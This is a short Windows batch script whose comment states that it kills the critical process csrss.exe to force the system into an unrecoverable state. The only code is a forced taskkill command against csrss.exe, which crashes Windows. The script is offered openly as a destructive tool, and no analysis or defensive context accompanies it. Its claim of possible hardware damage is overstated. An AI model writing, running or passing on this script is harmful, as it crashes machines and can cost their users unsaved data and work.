:: This program kills the critical system process csrss.exe to force the system into an unrecoverable state. It may result in serious hardware or software damage.
@echo off
taskkill /f /im csrss.exe
